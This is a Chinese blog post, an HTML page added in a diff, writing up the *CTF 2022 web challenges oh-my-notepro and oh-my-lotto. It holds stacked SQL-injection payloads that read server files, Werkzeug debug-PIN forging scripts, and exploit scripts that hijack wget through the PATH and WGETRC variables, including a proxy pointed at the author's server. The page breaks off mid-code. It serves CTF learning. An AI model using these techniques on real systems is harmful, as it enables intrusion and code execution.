@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/starctf/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/starctf/","path":"2023/12/25/starctf/","title":"starCTF-2022"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>starCTF-2022 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#oh-my-notepro"><span class="nav-text">oh-my-notepro</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#oh-my-lotto"><span class="nav-text">oh-my-lotto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E4%B8%80"><span class="nav-text">非预期一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E4%BA%8C"><span class="nav-text">非预期二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#oh-my-lotto-revenge"><span class="nav-text">oh-my-lotto-revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E4%B8%80-1"><span class="nav-text">非预期一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E4%BA%8C-1"><span class="nav-text">非预期二</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-text">预期解</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#oh-my-grafana"><span class="nav-text">oh-my-grafana</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/starctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="starCTF-2022 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          starCTF-2022
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/f4640c9e17413524f348d69d27edf89a.png" alt="image-20220423001508724"></p>
+<a id="more"></a>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>给学校做了攻防演练，耽搁了比赛，赛后复现下</p>
+<p>官方题目及wp：<a target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2022">starctf2022: Official source code and writeups of *CTF2022</a></p>
+<h1 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h1><ul>
+<li>python3.8 pin码计算</li>
+</ul>
+<p>发现sql注入，可以堆叠注入</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/1fa9332bb5feae03c74710bde9533923.png" alt="image-20220417091443301"></p>
+<p>生成要素</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username，    通过getpass.getuser()读取，通过文件读取&#x2F;etc&#x2F;passwd    </span><br><span class="line">modname，     通过getattr(mod,“file”,None)读取，默认值为flask.app</span><br><span class="line">appname，     通过getattr(app,“name”,type(app).name)读取，默认值为Flask</span><br><span class="line">moddir,       在flask库下app.py的绝对路径,  通过报错泄露</span><br><span class="line">uuidnode,     当前网络的mac地址的十进制数,   通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address读取</span><br><span class="line">machine_id,   由三个合并(docker就后两个)：</span><br><span class="line">              1.&#x2F;etc&#x2F;machine-id </span><br><span class="line">              2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id </span><br><span class="line">              3.&#x2F;proc&#x2F;self&#x2F;cgroup</span><br></pre></td></tr></table></figure>
+
+<p>通过sql注入读文件，load_file受到secure_file限制，利用 <strong>load data local infile</strong> 插到表里，再union读取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;设置group_concat长度</span><br><span class="line">;SET SESSION group_concat_max_len &#x3D; 102400;CREATE TABLE y0ng (code LONGTEXT);load data local infile &quot;&#x2F;etc&#x2F;machine-id&quot; into table y0ng FIELDS TERMINATED BY &#39;&#39;;%23</span><br><span class="line"></span><br><span class="line">&#39;union select 1,2,3,4,(select group_concat(code) from y0ng)%23</span><br></pre></td></tr></table></figure>
+
+<p>python3.8算pin使用sha1加密</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;636256807551824&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制 </span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;e86c4117-eed3-4a37-82bc-b5fa47a88e0b55f9ebbe1473751b9884fb19cbf4299adf5f9bbe231cc0d737df87db308bea0b&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+
+<p>这道题用**/etc/machine-id + /proc/self/cgroup** 算出了 pin，wp给出的解释为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Werkzeug的更新给pin码的计算方式带来了变化,新版本是从&#x2F;etc&#x2F;machine-id、&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id中读到一个值后立即break，然后和&#x2F;proc&#x2F;self&#x2F;cgroup中的id值拼接，使用拼接的值来计算pin码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/a20ef2f54756fdfc14316f7a816c7923.png" alt="image-20220417092549153"></p>
+<p>FLAG：*ctf{exploit_Update_with_Version}</p>
+<p>python3.6之前</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># username</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+
+<h1 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h1><p>分为了两个部分</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/916acc92ea0d8f80bb9a67448f9dcfe4.png" alt="image-20220420174119330"></p>
+<p>先看lotto的代码，生成20个40以内的随机数，然后存到 lotto_result.txt</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/126bef7d0b9b8b7500ef29265da5128c.png" alt="image-20220420174235746"></p>
+<p>再看app下，/result 返回/app/lotto_result.txt的内容</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/8a917f058c4ef4d4880347c743bcf3aa.png" alt="image-20220420175522832"></p>
+<p>/forecast 通过上传文件保存内容到/app/guess/forecast.txt</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/36bee6a30de7d054040394928a512d33.png" alt="image-20220420175550832"></p>
+<p>/lotto下是主要的代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/lotto&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lotto</span>():</span></span><br><span class="line">    message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 环境变量获取flag</span></span><br><span class="line">    flag = os.environ[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        lotto_key = request.form.get(<span class="string">&#x27;lotto_key&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        lotto_value = request.form.get(<span class="string">&#x27;lotto_value&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 传入的key 变为大写</span></span><br><span class="line">            lotto_key = lotto_key.upper()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            message = <span class="string">&#x27;Lotto Error!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br><span class="line">        <span class="comment"># key 进行安全检查</span></span><br><span class="line">        <span class="keyword">if</span> safe_check(lotto_key):</span><br><span class="line">            <span class="comment"># 这里可控一个环境变量的键值</span></span><br><span class="line">            os.environ[lotto_key] = lotto_value</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 去获取lotto_result.txt</span></span><br><span class="line">                os.system(<span class="string">&#x27;wget --content-disposition -N lotto&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 获取lotto的内容</span></span><br><span class="line">                <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/lotto_result.txt&quot;</span>):</span><br><span class="line">                    lotto_result = <span class="built_in">open</span>(<span class="string">&quot;/app/lotto_result.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lotto_result = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">                <span class="comment"># 获取猜测的内容</span></span><br><span class="line">                <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>):</span><br><span class="line">                    forecast = <span class="built_in">open</span>(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    forecast = <span class="string">&#x27;forecast&#x27;</span></span><br><span class="line">                <span class="comment">#两者相等 出flag</span></span><br><span class="line">                <span class="keyword">if</span> forecast == lotto_result:</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    message = <span class="string">&#x27;Sorry forecast failed, maybe lucky next time!&#x27;</span></span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">&quot;lotto error: &quot;</span>, e)</span><br><span class="line">                message = <span class="string">&#x27;Lotto Error!&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            message = <span class="string">&#x27;NO NO NO, JUST LOTTO!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br></pre></td></tr></table></figure>
+
+<p>安全检查函数为</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_check</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;LD&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;HTTP&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;BASH&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;ENV&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;PROXY&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;PS&#x27;</span> <span class="keyword">in</span> s: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="非预期一"><a href="#非预期一" class="headerlink" title="非预期一"></a>非预期一</h2><p>这里就可以围绕 wget 做文章，因为我们可控一个os.environ，整体思路就是控制 <strong>PATH</strong></p>
+<ol>
+<li>正常向/lotto post key-value，然后正常wget到 lotto_result.txt</li>
+<li>访问/result 获取到 lotto_result.txt 内容，再将内容上传为forecast.txt</li>
+<li>向/lotto post key-value，使wget失败，这样内容比较相等，获得flag</li>
+</ol>
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1.116.110.61:8880/&#x27;</span></span><br><span class="line"></span><br><span class="line">requests.post(url+<span class="string">&#x27;lotto&#x27;</span>,data=&#123;<span class="string">&quot;lotto_key&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;lotto_value&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;)</span><br><span class="line">r = requests.get(url+<span class="string">&#x27;result&#x27;</span>).text.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>).split(<span class="string">&quot;&lt;p&gt;&quot;</span>)[-<span class="number">1</span>].split(<span class="string">&quot;&lt;/p&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>,newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(r)</span><br><span class="line"></span><br><span class="line">requests.post(url+<span class="string">&#x27;forecast&#x27;</span>,files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">r = requests.post(url+<span class="string">&#x27;lotto&#x27;</span>,data=&#123;<span class="string">&quot;lotto_key&quot;</span>:<span class="string">&quot;PATH&quot;</span>,<span class="string">&quot;lotto_value&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>这里有个细节，上传的文件需要去除 <strong>\r</strong>，所以使用python3写入文件的时候使用 <strong>newline</strong> </p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/60bad7aa9300068ce73fb77a9c8633c8.png" alt="image-20220420210834830"></p>
+<h2 id="非预期二"><a href="#非预期二" class="headerlink" title="非预期二"></a>非预期二</h2><p>利用 <strong>WGETRC</strong> 设置 <strong>http_proxy</strong> 代理到自己服务器，下载一个和 <strong>forecast</strong> 一样的文件，可以获得flag。</p>
+<p>这个非预期去翻找了wget的文档，这里说如果设置了环境变量 wget 会去加载该文件</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/f7c8c4adaa934ea09b0d8c6057086663.png" alt="image-20220423100615409"></p>
+<p>然后就找到了wgetrc的一些命令，http_proxy，使用代理，这样可以使用 文件上传+环境变量可控 来使用这个http_proxy</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5ba26cdd936855315b197831c950d8fe.png" alt="image-20220423100847433"></p>
+<p>上传forecast.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http_proxy&#x3D;http:&#x2F;&#x2F;1.116.110.61:80</span><br></pre></td></tr></table></figure>
+
+<p>服务器测试一下</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/fe1128c0b787499f6ffe6e1f06e1c6a7.png" alt="image-20220423225306665"></p>
+<p>服务器上起一个flask，这样就控制了返回内容</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    lotto = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        n = <span class="built_in">str</span>(secrets.randbelow(<span class="number">40</span>))</span><br><span class="line">        lotto.append(n)</span><br><span class="line">    </span><br><span class="line">    r = <span class="string">&#x27;\n&#x27;</span>.join(lotto)</span><br><span class="line">    r = <span class="string">&#x27;http_proxy=http://1.116.110.61:80&#x27;</span>  <span class="comment"># 这里是通过代理获得的内容，与上传的内容一样</span></span><br><span class="line">    response = make_response(r)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=lotto_result.txt&#x27;</span></span><br><span class="line">    <span 